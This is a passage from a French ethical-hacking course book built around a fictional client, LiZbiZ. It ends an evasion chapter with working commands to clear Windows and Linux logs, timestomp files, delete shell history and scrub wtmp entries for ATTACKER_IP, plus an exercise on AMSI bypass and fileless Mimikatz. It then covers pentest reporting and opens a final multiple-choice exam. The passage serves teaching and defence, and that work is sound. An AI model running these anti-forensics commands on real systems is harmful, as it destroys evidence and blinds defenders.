\begin{lstlisting}[language=PowerShell, caption={Nettoyage des journaux Windows}]
# Effacer tous les journaux Windows (action bruyante, Event ID 1102)
wevtutil el | foreach { wevtutil cl $_ }

# Effacer uniquement les journaux de sécurité et système
wevtutil cl Security
wevtutil cl System
wevtutil cl "Windows PowerShell"
wevtutil cl "Microsoft-Windows-PowerShell/Operational"

# Supprimer les logs Sysmon (si installé)
wevtutil cl "Microsoft-Windows-Sysmon/Operational"
\end{lstlisting}

\begin{boxalert}
\textbf{Attention opérationnelle :} Effacer les journaux génère
l'événement \textbf{Event ID~1102} (Security log cleared) ou
\textbf{Event ID~104} (System log cleared), paradoxalement, c'est
une preuve de compromission évidente pour les analystes SOC. En pentest,
documenter \og{}nous aurions pu effacer les logs\fg{} est préférable
à les effacer réellement, sauf accord contractuel explicite.
\end{boxalert}

\subsection{Timestomping}
\label{subsec:timestomping}

Modification des horodatages \sigle{MACE} (\textit{Modified, Accessed,
Created, Entry Modified}) pour perturber la chronologie forensique.

\begin{lstlisting}[language=bash, caption={Timestomping, Linux et Windows}]
# ── LINUX ─────────────────────────────────────────────────────────────
# Modifier mtime et atime d'un fichier
touch -t 202201010000 backdoor.sh
# Copier les timestamps d'un fichier légitime
touch -r /bin/ls backdoor.sh

# ── WINDOWS (Meterpreter) ─────────────────────────────────────────────
meterpreter > timestomp C:\Temp\payload.exe -z
# -z : zéroiser tous les timestamps

meterpreter > timestomp C:\Temp\payload.exe -f C:\Windows\System32\calc.exe
# -f : copier les timestamps d'un fichier légitime

# ── WINDOWS (PowerShell) ──────────────────────────────────────────────
$file = Get-Item "C:\Temp\payload.exe"
$file.LastWriteTime  = [datetime]"2022-01-15 10:30:00"
$file.LastAccessTime = [datetime]"2022-01-15 10:30:00"
$file.CreationTime   = [datetime]"2022-01-15 10:30:00"
\end{lstlisting}

\subsection{Suppression des Artefacts d'Exécution}
\label{subsec:artifacts}

\begin{lstlisting}[language=PowerShell, caption={Nettoyage complet des artefacts Windows}]
# Historique PowerShell
Clear-History
Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue

# Fichiers temporaires
Remove-Item -Recurse -Force $env:TEMP\* -ErrorAction SilentlyContinue
Remove-Item -Recurse -Force "C:\Windows\Temp\*" -ErrorAction SilentlyContinue

# Prefetch (traces d'exécution de programmes, nécessite droits admin)
Remove-Item C:\Windows\Prefetch\MIMIKATZ*.pf -ErrorAction SilentlyContinue

# Entrées de registre de persistance
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" \
    -Name "WindowsUpdate" -ErrorAction SilentlyContinue

# Recent files (MRU, Most Recently Used)
Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" \
    -Recurse -ErrorAction SilentlyContinue
\end{lstlisting}

\begin{lstlisting}[language=bash, caption={Nettoyage des artefacts Linux}]
# Historique shell
history -c && history -w
unset HISTFILE
echo "" > ~/.bash_history
rm -f ~/.bash_history ~/.zsh_history

# Logs système (nécessite root)
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
echo "" > /var/log/apache2/access.log
echo "" > /var/log/apache2/error.log

# Supprimer les fichiers temporaires déposés
rm -f /tmp/linpeas.sh /tmp/chisel /tmp/.lp.sh

# Effacer les traces dans les logs wtmp/btmp (connexions SSH)
utmpdump /var/log/wtmp | grep -v "ATTACKER_IP" | \
    utmpdump -r > /tmp/wtmp.clean
mv /tmp/wtmp.clean /var/log/wtmp
\end{lstlisting}

% ==============================================================================
\section{Synthèse : Tableau de Bord Évasion LiZbiZ}
\label{sec:synthese_evasion}
% ==============================================================================

\begin{table}[htbp]
\centering
\caption{Synthèse des techniques d'évasion, LiZbiZ}
\label{tab:synthese_evasion}
\begin{tabular}{p{3cm}p{3.5cm}p{3cm}p{4cm}}
\toprule
\textbf{Technique} & \textbf{Objectif} & \textbf{MITRE} & \textbf{Contre-mesure} \\
\midrule
AMSI Bypass
    & Exécuter PowerShell offensif
    & T1562.001
    & AMSI providers tiers, Constrained Language Mode \\
\addlinespace
LotL / Certutil
    & Télécharger sans AV
    & T1218
    & Surveillance des LoLBins, AppLocker \\
\addlinespace
Invoke-Mimikatz
    & Credential dump sans fichier
    & T1059.001
    & Credential Guard, PPL pour LSASS \\
\addlinespace
Process Injection
    & Masquer le code malveillant
    & T1055
    & Surveillance API CreateRemoteThread \\
\addlinespace
WMI Persistence
    & Persistance invisible
    & T1546.003
    & Surveillance WMI subscriptions \\
\addlinespace
Timestomping
    & Perturber la forensique
    & T1070.006
    & \$MFT (NTFS journal), logs Sysmon \\
\addlinespace
Log Clearing
    & Effacer les traces
    & T1070.001
    & SIEM externe, forwarding immédiat \\
\bottomrule
\end{tabular}
\end{table}

% ==============================================================================
\section*{Points Clés à Retenir}
% ==============================================================================

\begin{boxinfo}
\textbf{Ce qu'il faut retenir de ce chapitre :}
\begin{enumerate}
    \item Les \sigle{EDR} modernes voient \textbf{bien plus} que les \sigle{AV}
          classiques, contourner un \sigle{EDR} requiert le bypass des
          hooks userland et d'\sigle{ETW}.
    \item \textbf{AMSI} doit être bypassé avant tout usage de PowerShell
          offensif, plusieurs techniques existent selon le niveau de
          détection.
    \item Les \textbf{LoLBins} sont souvent sous-surveillés, les SOC
          oublient que certutil et regsvr32 peuvent télécharger et exécuter
          du code.
    \item Les \textbf{attaques fileless} ne laissent aucune trace sur disque
         , seule une surveillance mémoire et comportementale les détecte.
    \item \textbf{Effacer les logs génère un événement} (ID~1102/104) —
          documenter dans le rapport plutôt qu'exécuter en conditions réelles.
    \item Le \textbf{timestomping} ne résiste pas à l'analyse du journal
          \sigle{NTFS} (\texttt{\$MFT}), les horodatages \sigle{MFT}
          ne sont pas modifiés par \texttt{touch}/Meterpreter.
\end{enumerate}
\end{boxinfo}

% ==============================================================================
\section*{Exercice Pratique}
% ==============================================================================

\begin{boxexo}
\textbf{Exercice 7.1, Bypass AMSI et Invoke-Mimikatz fileless}

\medskip
\textbf{Cible :} VM Windows Server 2019 du lab LiZbiZ.

\medskip
\textbf{Tâches :}
\begin{enumerate}
    \item Tenter de lancer \texttt{Invoke-Mimikatz} directement dans
          PowerShell, observer le blocage AMSI.
    \item Appliquer la technique de bypass AMSI par patch de
          \texttt{amsiInitFailed}.
    \item Réessayer \texttt{Invoke-Mimikatz}, confirmer l'exécution.
    \item Mettre en place une persistance WMI Event Subscription avec
          un payload bénin (ex.~: \texttt{calc.exe}) et vérifier
          l'exécution au démarrage.
    \item Nettoyer tous les artefacts et vérifier avec l'Event Viewer
          que l'Event ID~1102 a été généré.
    \item Identifier dans le rapport la contre-mesure qui aurait détecté
          chaque technique.
\end{enumerate}

\medskip
\textbf{Livrable :} Tableau \ref{tab:synthese_evasion} complété pour
le lab LiZbiZ + justification de chaque contre-mesure.
\end{boxexo}


% -------------------------------------------------------------------
% PARTIE III — Restitution et Évaluation
% -------------------------------------------------------------------
\part{Restitution Professionnelle et Évaluation}

% Chapitre 8 — Rédaction du rapport de pentest
% ==============================================================================
% Fichier     : chapitres/08_reporting.tex
% Titre       : Rédaction du Rapport de Pentest et Remédiation
% Auteur      : MINKA MI NGUIDJOÏ Thierry Emmanuel

% ==============================================================================

\chapter{Rédaction du Rapport de Pentest et Remédiation}
\label{chap:reporting}

La phase technique est terminée. La \textbf{valeur ajoutée d'un pentester}
ne réside pas dans le nombre de machines compromises, mais dans la qualité
du rapport final. Ce document doit être compréhensible à la fois par les
équipes techniques (pour corriger) et par la direction (pour arbitrer les
budgets de sécurité). Un rapport de qualité professionnelle transforme des
\sigle{PoC} techniques en décisions d'investissement.

% ==============================================================================
\section{Structure du Rapport de Pentest}
\label{sec:rapport_structure}
% ==============================================================================

Le rapport suit une structure standardisée inspirée du \sigle{PTES}
(\textit{Reporting Phase}) et adaptée aux attentes des clients
professionnels. Il se compose de deux parties distinctes destinées à des
audiences différentes.

\subsection{Synthèse Exécutive (\textit{Executive Summary})}
\label{subsec:exec_summary}

La synthèse exécutive est destinée aux \textbf{décideurs} : \sigle{PDG},
\sigle{DSI}, \sigle{RSSI}, Conseil d'Administration. Elle doit tenir sur
1 à 2 pages maximum et ne contenir aucun jargon technique.

\begin{boxlizbiz}
\textbf{Template Executive Summary, LiZbiZ :}

\medskip
\textbf{Contexte et périmètre}

Du [DATE] au [DATE], le cabinet [NOM] a réalisé un test d'intrusion
de type \textit{Gray Box} sur l'infrastructure de LiZbiZ, conformément
au mandat signé le [DATE]. Le périmètre couvrait 8 systèmes incluant les
serveurs web, le portail employé, l'Active Directory et les extensions
cloud.

\medskip
\textbf{Résultats globaux}

\begin{center}
\begin{tabular}{lc}
\toprule
\textbf{Criticité} & \textbf{Nombre de vulnérabilités} \\
\midrule
Critique (CVSS 9.0--10.0) & 3 \\
Élevé (CVSS 7.0--8.9)     & 5 \\
Moyen (CVSS 4.0--6.9)     & 8 \\
Faible (CVSS 0.1--3.9)    & 4 \\
\midrule
\textbf{Total}             & \textbf{20} \\
\bottomrule
\end{tabular}
\end{center}

\medskip
\textbf{Constats majeurs}

L'infrastructure de LiZbiZ présente des vulnérabilités critiques permettant
à un attaquant externe d'obtenir le contrôle total du domaine Active Directory
en moins de 4~heures, sans exploiter de vulnérabilité de type \textit{zero-day}.
Les vecteurs principaux sont : un serveur web non mis à jour exposé sur Internet,
une vulnérabilité critique non patchée sur le service SMB Windows, et une
politique de mots de passe insuffisante sur les comptes de service.

\medskip
\textbf{Recommandations prioritaires}
\begin{enumerate}
    \item Appliquer immédiatement le patch \sigle{MS17-010} sur tous les
          serveurs Windows.
    \item Mettre à jour Apache~2.2.22 vers une version supportée (2.4.x+).
    \item Renforcer la politique de mots de passe des comptes de service
          (20 caractères minimum, rotation trimestrielle).
\end{enumerate}
\end{boxlizbiz}

\subsection{Méthodologie et Périmètre}
\label{subsec:methodologie_rapport}

Cette section détaille l'approche technique pour les équipes \sigle{IT} :
\begin{itemize}
    \item \textbf{Type de test :} Gray Box, compte \og{}stagiaire\fg{}
          fourni pour l'intranet.
    \item \textbf{Méthodologie :} PTES (\textit{Penetration Testing Execution
          Standard}), avec mapping \sigle{MITRE ATT\&CK} pour chaque
          technique employée.
    \item \textbf{Outils utilisés :} Nmap, Metasploit, SQLMap, BloodHound,
          Mimikatz, Chisel, GoPhish.
    \item \textbf{Périmètre testé :} Liste précise des \sigle{IP} et \sigle{URL}
          testées (référencer l'Annexe~A, tableau des cibles).
    \item \textbf{Périmètre exclu :} Actions DoS, COMEX, systèmes de paiement.
\end{itemize}

\subsection{Résultats Techniques (\textit{Findings})}
\label{subsec:findings}

C'est le cœur du rapport. Chaque vulnérabilité découverte fait l'objet
d'une fiche détaillée standardisée.

% ==============================================================================
\section{Le Score CVSS v3.1}
\label{sec:cvss}
% ==============================================================================

\begin{boxdef}
\textbf{CVSS v3.1} (\textit{Common Vulnerability Scoring System}, version~3.1,
publiée par le \sigle{FIRST} en 2019) : standard international de notation
de la gravité des vulnérabilités, de~0 (aucune) à~10 (critique). Le score
est calculé à partir de trois groupes de métriques : \textbf{Base},
\textbf{Temporal} et \textbf{Environmental}.
\end{boxdef}

\begin{table}[htbp]
\centering
\caption{Échelle de criticité CVSS v3.1}
\label{tab:cvss_scale}
\begin{tabular}{lll}
\toprule
\textbf{Score} & \textbf{Criticité} & \textbf{Action recommandée} \\
\midrule
0.0         & Informatif & Aucune urgence \\
0.1 -- 3.9  & Faible     & Traitement lors de la prochaine maintenance \\
4.0 -- 6.9  & Moyen      & Traitement sous 3 mois \\
7.0 -- 8.9  & Élevé      & Traitement sous 1 mois \\
9.0 -- 10.0 & Critique   & Traitement immédiat (sous 72h) \\
\bottomrule
\end{tabular}
\end{table}

\subsection{Métriques de Base CVSS v3.1}
\label{subsec:cvss_metrics}

\begin{table}[htbp]
\centering
\caption{Métriques Base CVSS v3.1 et leurs valeurs}
\label{tab:cvss_metrics}
\begin{tabular}{p{4cm}p{4cm}p{5.5cm}}
\toprule
\textbf{Métrique} & \textbf{Valeurs} & \textbf{Signification} \\
\midrule
Attack Vector (\sigle{AV})
    & Network / Adjacent / Local / Physical
    & Comment l'attaquant accède au système \\
\addlinespace
Attack Complexity (\sigle{AC})
    & Low / High
    & Conditions nécessaires à l'exploitation \\
\addlinespace
Privileges Required (\sigle{PR})
    & None / Low / High
    & Niveau de privilèges requis \\
\addlinespace
User Interaction (\sigle{UI})
    & None / Required
    & Interaction utilisateur nécessaire \\
\addlinespace
Scope (\sigle{S})
    & Unchanged / Changed
    & Impact au-delà du composant vulnérable \\
\addlinespace
Confidentiality (\sigle{C})
    & None / Low / High
    & Impact sur la confidentialité \\
\addlinespace
Integrity (\sigle{I})
    & None / Low / High
    & Impact sur l'intégrité \\
\addlinespace
Availability (\sigle{A})
    & None / Low / High
    & Impact sur la disponibilité \\
\bottomrule
\end{tabular}
\end{table}

\begin{boxinfo}
\textbf{CVSS v4.0, Évolution (novembre 2023) :}
La version~4.0 introduit quatre groupes de métriques : \textit{Base}
(inchangé), \textit{Threat} (exploitabilité réelle, remplace Temporal),
\textit{Environmental} (contexte spécifique de l'organisation) et
\textit{Supplemental} (informations additionnelles non scorées).
Elle distingue également les scores \og{}CVSS-B\fg{} (Base),
\og{}CVSS-BT\fg{} (Base+Threat) et \og{}CVSS-BE\fg{} (Base+Environmental).
Les rapports professionnels de 2024+ doivent préciser la version utilisée.
Ce cours utilise \textbf{CVSS v3.1} comme référence principale.
\end{boxinfo}

% ==============================================================================
\section{Modèle de Fiche de Vulnérabilité}
\label{sec:fiche_vuln}
% ==============================================================================

Chaque \textit{finding} doit suivre un format standardisé permettant une
lecture rapide par les équipes techniques et une priorisation claire par
la direction.

\begin{table}[htbp]
\centering
\caption{Fiche de constat technique, Injection SQL (LiZbiZ)}
\label{tab:fiche_sqli}
\begin{tabular}{p{3.5cm}p{10cm}}
\toprule
\textbf{Champ} & \textbf{Valeur} \\
\midrule
Titre
    & Injection SQL sur le formulaire de recherche \\
\addlinespace
Référence
    & FINDING-001 \\
\addlinespace
Sévérité
    & \textbf{CRITIQUE} \\
\addlinespace
Score CVSS v3.1
    & \textbf{9.8}, AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H \\
\addlinespace
CVE associée
    & N/A (vulnérabilité custom), CWE-89 (\textit{SQL Injection}) \\
\addlinespace
MITRE ATT\&CK
    & T1190 (\textit{Exploit Public-Facing Application}) \\
\addlinespace
Cible
    & \texttt{http://203.0.113.10/search.php} \\
\addlinespace
Description
    & Le paramètre \texttt{id} de la requête POST n'est pas filtré.
      Un attaquant peut injecter du code SQL arbitraire pour lire ou
      modifier la base de données sans authentification. \\
\addlinespace
Preuve (\sigle{PoC})
    & Capture d'écran (Annexe~B-001) montrant l'extraction de la table
      \texttt{users} via SQLMap. Hash SHA-256 de la preuve :
      \texttt{3a7f8d...} \\
\addlinespace
Impact business
    & Vol de l'intégralité des données clients (47 enregistrements
      dont données personnelles), exposition \sigle{RGPD}, amende
      potentielle jusqu'à 4\% du CA annuel. \\
\addlinespace
Recommandation
    & Utiliser des requêtes préparées (\textit{Prepared Statements})
      dans le code PHP. Implémenter un \sigle{WAF} en couche de
      compensation. Ne jamais concaténer les entrées utilisateur dans
      les requêtes SQL. \\
\addlinespace
Correction vs compensation
    & \textbf{Correction} : Prepared Statements (délai estimé : 2j).
      \textbf{Compensation} : Règle WAF bloquant les patterns SQLi. \\
\addlinespace
Référence
    & OWASP Top~10 2021, A03:2021 (Injection),
      OWASP Testing Guide v4.2 \S4.7.5. \\
\bottomrule
\end{tabular}
\end{table}

\begin{table}[htbp]
\centering
\caption{Fiche de constat technique, EternalBlue MS17-010}
\label{tab:fiche_eternal}
\begin{tabular}{p{3.5cm}p{10cm}}
\toprule
\textbf{Champ} & \textbf{Valeur} \\
\midrule
Titre
    & Absence de patch MS17-010 (EternalBlue) \\
\addlinespace
Référence
    & FINDING-002 \\
\addlinespace
Sévérité
    & \textbf{CRITIQUE} \\
\addlinespace
Score CVSS v3.1
    & \textbf{9.8}, AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H \\
\addlinespace
CVE associée
    & CVE-2017-0144 \\
\addlinespace
MITRE ATT\&CK
    & T1210 (\textit{Exploitation of Remote Services}),
      T1569.002 (\textit{Service Execution}) \\
\addlinespace
Cible
    & 192.168.10.20 (Windows Server 2012 R2) \\
\addlinespace
Description
    & Vulnérabilité de débordement de tampon dans SMBv1 permettant
      l'exécution de code arbitraire à distance sans authentification.
      Patch disponible depuis mars 2017 (MS17-010). \\
\addlinespace
Preuve (\sigle{PoC})
    & Capture d'écran (Annexe~B-002) : shell SYSTEM obtenu en 28
      secondes. Output de \texttt{getuid} : \texttt{NT AUTHORITY\textbackslash{}SYSTEM}.
      Hash SHA-256 : \texttt{8b2c4f...} \\
\addlinespace
Impact business
    & Contrôle total du serveur Windows, accès aux données RH,
      possibilité de ransomware, point de pivot vers l'AD. \\
\addlinespace
Recommandation
    & Appliquer immédiatement le patch MS17-010. Désactiver SMBv1
      sur tous les systèmes (sauf nécessité opérationnelle documentée).
      Segmenter le réseau pour isoler les serveurs Windows. \\
\addlinespace
Correction vs compensation
    & \textbf{Correction} : Patch MS17-010 (délai : 24h).
      \textbf{Compensation} : Bloquer le port 445 au niveau du
      pare-feu interne. \\
\bottomrule
\end{tabular}
\end{table}

% ==============================================================================
\section{Plan de Remédiation et Priorisation}
\label{sec:remediation}
% ==============================================================================

\subsection{Matrice de Priorisation}
\label{subsec:priorisation}

Le plan de remédiation doit être actionnable et priorisé selon le risque
réel, non selon la complexité technique de la correction.

\begin{table}[htbp]
\centering
\caption{Plan de remédiation LiZbiZ, priorisé par criticité et effort}
\label{tab:plan_remediation}
\begin{tabular}{p{0.4cm}p{3.5cm}p{1.5cm}p{2cm}p{4.5cm}}
\toprule
\textbf{\#} & \textbf{Vulnérabilité} & \textbf{CVSS} & \textbf{Délai} & \textbf{Action corrective} \\
\midrule
1 & MS17-010 EternalBlue
    & 9.8 Critique
    & 24h
    & Patch MS17-010, désactiver SMBv1 \\
\addlinespace
2 & Injection SQL / login
    & 9.8 Critique
    & 2j
    & Prepared Statements + WAF \\
\addlinespace
3 & Apache 2.2.22 (RCE)
    & 9.8 Critique
    & 48h
    & Mise à jour vers Apache 2.4.x \\
\addlinespace
4 & Phishing (taux 34\%)
    & 8.1 Élevé
    & 1 mois
    & Sensibilisation + MFA \\
\addlinespace
5 & LDAP anonymous bind
    & 7.5 Élevé
    & 1 mois
    & Désactiver l'accès anonyme LDAP \\
\addlinespace
6 & Politique mdp comptes service
    & 7.2 Élevé
    & 1 mois
    & 20 chars min + rotation 90j \\
\addlinespace
7 & Répertoire /backup/ exposé
    & 6.5 Moyen
    & 3 mois
    & Restriction d'accès + .htaccess \\
\addlinespace
8 & XSS stored intranet
    & 6.1 Moyen
    & 3 mois
    & Encodage sorties HTML + CSP \\
\bottomrule
\end{tabular}
\end{table}

\subsection{Correction vs Compensation}
\label{subsec:correction_compensation}

\begin{boxdef}
\textbf{Correction :} Suppression de la faille à la source, mise à jour
du logiciel, correction du code, reconfiguration.

\textbf{Compensation (Mitigation) :} Barrière ajoutée en couche de
protection lorsque la correction directe est impossible ou trop longue
— règle de pare-feu, \sigle{WAF}, désactivation du service.
La compensation ne supprime pas la vulnérabilité : elle réduit la
surface d'exposition dans l'attente de la correction définitive.
\end{boxdef}

% ==============================================================================
\section{Livrable Final et Débriefing}
\label{sec:livrable_debrief}
% ==============================================================================

\subsection{Structure des Livrables}
\label{subsec:livrables_finaux}

\begin{table}[htbp]
\centering
\caption{Livrables finaux de la mission LiZbiZ}
\label{tab:livrables_finaux}
\begin{tabular}{p{3.5cm}p{2.5cm}p{7cm}}
\toprule
\textbf{Livrable} & \textbf{Format} & \textbf{Contenu} \\
\midrule
Rapport Exécutif
    & PDF (5--10 pages)
    & Synthèse, tableau de criticité, 3 recommandations prioritaires \\
\addlinespace
Rapport Technique
    & PDF (20--40 pages)
    & Méthodologie, 20 fiches de vulnérabilités, mapping MITRE,
      plan de remédiation priorisé \\
\addlinespace
Annexe A, Périmètre
    & PDF
    & Liste complète des cibles testées avec adresses IP et URLs \\
\addlinespace
Annexe B, Preuves
    & ZIP chiffré
    & Captures d'écran horodatées + hashes \sigle{SHA-256},
      fichiers flags, logs de sessions \\
\addlinespace
Scripts \sigle{PoC}
    & ZIP chiffré
    & Exploits utilisés, scripts personnalisés, instructions de
      reproduction \\
\addlinespace
Présentation Débriefing
    & \sigle{PPTX}/\sigle{PDF}
    & Support 15 slides pour la réunion de restitution \\
\bottomrule
\end{tabular}
\end{table}

\begin{boxinfo}
\textbf{Chaîne de custody des livrables :} Chaque fichier de preuve
doit être accompagné de son hash \sigle{SHA-256} calculé immédiatement
après capture (Section~\ref{sec:preuves}). L'archive ZIP contenant les
preuves doit être chiffrée (\sigle{AES-256}) et transmise de façon
sécurisée (canal chiffré, jamais par email non chiffré).

\begin{lstlisting}[language=bash]
# Créer l'archive chiffrée des preuves
zip -e -r preuves_lizbiz_YYYYMMDD.zip ./preuves/
# Ou avec gpg (symétrique)
tar czf - ./preuves/ | gpg -c --cipher-algo AES256 \
    -o preuves_lizbiz_YYYYMMDD.tar.gz.gpg

# Calculer le hash de l'archive finale
sha256sum preuves_lizbiz_YYYYMMDD.tar.gz.gpg >> livraison_manifest.txt
\end{lstlisting}
\end{boxinfo}

\subsection{La Réunion de Débriefing}
\label{subsec:debrief}

La mission se conclut par une \textbf{réunion de restitution} structurée
en trois temps :

\begin{enumerate}
    \item \textbf{Présentation exécutive} (30~min) : synthèse des risques
          majeurs pour la direction, sans jargon technique. Utiliser
          des analogies métier pour expliquer l'impact (ex.~:
          \og{}EternalBlue permettrait à un ransomware de chiffrer tous
          vos serveurs Windows en moins de 10~minutes\fg{}).
    \item \textbf{Revue technique} (60~min) : démonstration des \sigle{PoC}
          avec les équipes \sigle{IT}/\sigle{SOC}. Chaque finding est
          présenté avec sa preuve, son score \sigle{CVSS} et la
          contre-mesure recommandée.
    \item \textbf{Plan d'action} (30~min) : validation collective du
          planning de remédiation et désignation des propriétaires de
          chaque action corrective.
\end{enumerate}

\begin{boxalert}
\textbf{Transmission sécurisée du rapport :} Le rapport de pentest contient
des informations hautement sensibles sur les vulnérabilités du client.
Il ne doit \textbf{jamais} être transmis par email non chiffré. Utiliser
un canal chiffré \sigle{E2E} ou une plateforme de partage sécurisée
(\sigle{SFTP}, portail chiffré). Le rapport doit être supprimé des
systèmes du prestataire à l'issue de la mission selon les termes du
contrat de confidentialité.
\end{boxalert}

% ==============================================================================
\section*{Points Clés à Retenir}
% ==============================================================================

\begin{boxinfo}
\textbf{Ce qu'il faut retenir de ce chapitre :}
\begin{enumerate}
    \item Le rapport est le \textbf{produit final} du pentest, un
          excellent rapport sur des résultats modestes vaut mieux qu'un
          mauvais rapport sur des résultats brillants.
    \item L'\textbf{Executive Summary} ne doit contenir aucun jargon
          technique, il s'adresse aux décideurs, pas aux ingénieurs.
    \item Chaque fiche de vulnérabilité doit inclure \textbf{CVE/CWE,
          CVSS v3.1 avec vecteur complet, référence MITRE ATT\&CK,
          PoC avec hash SHA-256, impact business, et recommandation}.
    \item La distinction \textbf{Correction vs Compensation} est
          fondamentale, elle donne de la flexibilité au client sur
          le délai de remédiation.
    \item Les livrables doivent être \textbf{chiffrés et signés} avant
          transmission, le rapport expose toutes les failles du client.
    \item \textbf{CVSS v3.1} est la version de référence du cours ;
          CVSS v4.0 (nov.~2023) sera progressivement adopté, toujours
          préciser la version dans le rapport.
\end{enumerate}
\end{boxinfo}

% ==============================================================================
\section*{Exercice Pratique}
% ==============================================================================

\begin{boxexo}
\textbf{Exercice 8.1, Rédaction d'un rapport de pentest LiZbiZ}

\medskip
\textbf{Objectif :} Produire un rapport de pentest professionnel complet
sur la base des résultats des exercices précédents.

\medskip
\textbf{Tâches :}
\begin{enumerate}
    \item Rédiger une \textbf{synthèse exécutive} d'une page (tableau de
          criticité + 3 recommandations prioritaires en langage non technique).
    \item Compléter \textbf{5 fiches de vulnérabilités} au format
          Tableau~\ref{tab:fiche_sqli}, incluant :
          CVE/CWE, score \sigle{CVSS v3.1} avec vecteur complet,
          référence MITRE ATT\&CK, capture d'écran \sigle{PoC} avec
          hash \sigle{SHA-256}, impact business, recommandation
          correction + compensation.
    \item Établir le \textbf{plan de remédiation priorisé} au format
          Tableau~\ref{tab:plan_remediation}.
    \item Créer l'archive chiffrée des preuves et calculer son
          hash SHA-256.
\end{enumerate}

\medskip
\textbf{Livrable :} Rapport PDF complet (10--15 pages) + archive ZIP
chiffrée des preuves. Le rapport sera évalué sur la clarté de
l'Executive Summary, la complétude des fiches et la précision des
scores CVSS.
\end{boxexo}


% Chapitre 9 — Évaluation finale
% ==============================================================================
% Fichier : 09_evaluation_finale.tex
% Description : Évaluation Finale du cours de Hacking Éthique Avancé
% ==============================================================================

\chapter{Évaluation Finale du Cours}

Cette évaluation valide l'acquisition des compétences avancées en hacking éthique, couvrant les aspects juridiques, méthodologiques, techniques (recon, exploitation, post-exploitation) et professionnels (reporting).

% ------------------------------------------------------------------------------
\section{Partie A : QCM (Choix Multiples)}
% ------------------------------------------------------------------------------

\textbf{Consigne :} Cochez la ou les bonnes réponses.

\subsection*{Module 1 : Cadre Juridique et Méthodologique}
\begin{enumerate}
    \item En France, le cadre juridique principal encadrant les infractions informatiques est :
    \begin{itemize}
        \item[A.] Le RGPD
        \item[B.] Le Code pénal (Articles 323-1 et suivants)
        \item[C.] La loi Godfrain
        \item[D.] La norme ISO 27001
    \end{itemize}

    \item Quelle méthodologie divise le pentest en 7 phases distinctes ?
    \begin{itemize}
        \item[A.] OSSTMM
        \item[B.] PTES (Penetration Testing Execution Standard)
        \item[C.] NIST SP 800-115
        \item[D.] OWASP Testing Guide
    \end{itemize}

    \item Un test "Gray Box" signifie que :
    \begin{itemize}
        \item[A.] L'auditeur n'a aucune information préalable.
        \item[B.] L'auditeur dispose d'informations partielles (ex: compte utilisateur standard).
        \item[C.] L'auditeur a un accès complet (code source, configuration).
        \item[D.] L'auditeur ne dispose que d'une adresse IP publique.
    \end{itemize}

    \item La règle des "Règles d'Engagement" (ROE) définit principalement :
    \begin{itemize}
        \item[A.] Le prix de la prestation
        \item[B.] Les horaires et les actions interdites
        \item[C.] La méthode de nettoyage des traces
        \item[D.] La marque de café préférée du client
    \end{itemize}
\end{enumerate}

\subsection*{Module 2 : Reconnaissance et OSINT}
\begin{enumerate}
    \setcounter{enumi}{4}
    \item L'OSINT (Open Source Intelligence) se caractérise par :
    \begin{itemize}
        \item[A.] Une interaction directe avec les systèmes de la cible.
        \item[B.] La collecte d'informations publiques sans contact direct.
        \item[C.] L'utilisation exclusive d'outils de hacking.
        \item[D.] Un scan de ports intrusif.
    \end{itemize}

    \item Quel outil est principalement utilisé pour recher des vulnérabilités sur des documents publics via Google ?
    \begin{itemize}
        \item[A.] Shodan
        \item[B.] theHarvester
        \item[C.] Google Dorks
        \item[D.] Maltego
    \end{itemize}

    \item L'outil \texttt{Shodan} est utilisé pour :
    \begin{itemize}
        \item[A.] Scanner les ports locaux.
        \item[B.] Découvrir les appareils connectés à Internet.
        \item[C.] Cracker les mots de passe.
        \item[D.] Analyser le code source.
    \end{itemize}

    \item La commande \texttt{dig axfr} sert à :
    \begin{itemize}
        \item[A.] Effectuer un transfert de zone DNS (Zone Transfer).
        \item[B.] Scanner les ports TCP.
        \item[C.] Faire du brute force.
        \item[D.] Analyser les métadonnées d'une image.
    \end{itemize}
\end{enumerate}

\subsection*{Module 3 : Scanning et Énumération}
\begin{enumerate}
    \setcounter{enumi}{8}
    \item Le scan "SYN Scan" (-sS) est qualifié de :
    \begin{itemize}
        \item[A.] Complet et bruyant (logs).
        \item[B.] Furtif (demi-ouvert) et rapide.
        \item[C.] Impossible à réaliser sous Linux.
        \item[D.] Uniquement pour les protocoles UDP.
    \end{itemize}

    \item Dans Nmap, l'état "Filtered" signifie que :
    \begin{itemize}
        \item[A.] Le port est ouvert et une application écoute.
        \item[B.] Le port est fermé.
        \item[C.] Un pare-feu bloque l'accès.
        \item[D.] L'hôte est éteint.
    \end{itemize}

    \item L'énumération SMB (ports 139/445) permet de découvrir :
    \begin{itemize}
        \item[A.] Des partages réseaux et des utilisateurs.
        \item[B.] Des mots de passe en clair.
        \item[C.] La version exacte du BIOS.
        \item[D]. Les clés SSH.
    \end{itemize}

    \item L'outil \texttt{Dirb} est utilisé pour :
    \begin{itemize}
        \item[A.] Lancer des attaques DoS.
        \item[B]. Découvrir des répertoires et fichiers cachés sur un serveur web.
        \item[C.] Analyser le trafic réseau.
        \item[D.] Bruteforcer des identifiants SSH.
    \end{itemize}
\end{enumerate}

\subsection*{Module 4 : Exploitation}
\begin{enumerate}
    \setcounter{enumi}{12}
    \item Une injection SQL de type "Blind" signifie que :
    \begin{itemize}
        \item[A.] L'attaquant peut voir les données directement sur la page.
        \item[B.] L'attaquant ne voit pas les données mais peut les déduire via des messages d'erreur ou le temps de réponse.
        \item[C.] L'attaquant peut exécuter des commandes système.
        \item[D.] L'attaquant peut écrire dans la base de données mais pas lire.
    \end{itemize}

    \item Quel outil est le standard pour l'exploitation de vulnérabilités ?
    \begin{itemize}
        \item[A.] Nmap
        \item[B.] Metasploit Framework
        \item[C.] Wireshark
        \item[D.] Burp Suite
    \end{itemize}

    \item Un "Reverse Shell" fonctionne de la manière suivante :
    \begin{itemize}
        \item[A.] L'attaquant se connecte à la cible sur un port spécifique.
        \item[B.] La cible se connecte à l'attaquant sur un port spécifique.
        \item[C.] L'attaquant envoie un fichier à la cible.
        \item[D.] La cible télécharge une mise à jour.
    \end{itemize}

    \item L'outil \texttt{SQLMap} est utilisé pour automatiser :
    \begin{itemize}
